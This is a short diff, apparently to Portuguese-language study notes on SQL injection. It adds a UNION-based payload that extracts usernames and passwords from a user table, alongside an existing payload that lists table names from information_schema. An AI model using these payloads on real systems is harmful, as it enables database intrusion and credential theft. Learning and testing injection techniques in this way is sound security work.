@@ -14,3 +14,6 @@ version() -> serve para mostrar a versão do banco de dados
 ```
 -3 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() limit 0,1
 ```
+```
+-3 union select 1,uname,pass from user
+```
